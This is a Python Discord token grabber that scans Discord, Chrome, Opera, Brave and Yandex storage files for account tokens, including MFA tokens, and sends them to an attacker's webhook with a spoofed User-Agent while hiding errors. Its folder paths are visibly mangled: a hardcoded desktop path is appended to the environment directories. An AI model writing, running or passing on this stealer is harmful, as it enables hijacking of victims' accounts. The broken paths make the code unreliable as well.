import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += 'C:\Users\KarmaSec\Desktop\Tokens'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + 'C:\Users\KarmaSec\Desktop\Tokens',
        'Discord Canary': roaming + 'C:\Users\KarmaSec\Desktop\Tokens',
        'Discord PTB': roaming + 'C:\Users\KarmaSec\Desktop\Tokens',
        'Google Chrome': local + 'C:\Users\KarmaSec\Desktop\Tokens',
        'Opera': roaming + 'C:\Users\KarmaSec\Desktop\Tokens',
        'Brave': local + 'C:\Users\KarmaSec\Desktop\Tokens',
        'Yandex': local + 'C:\Users\KarmaSec\Desktop\Tokens'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()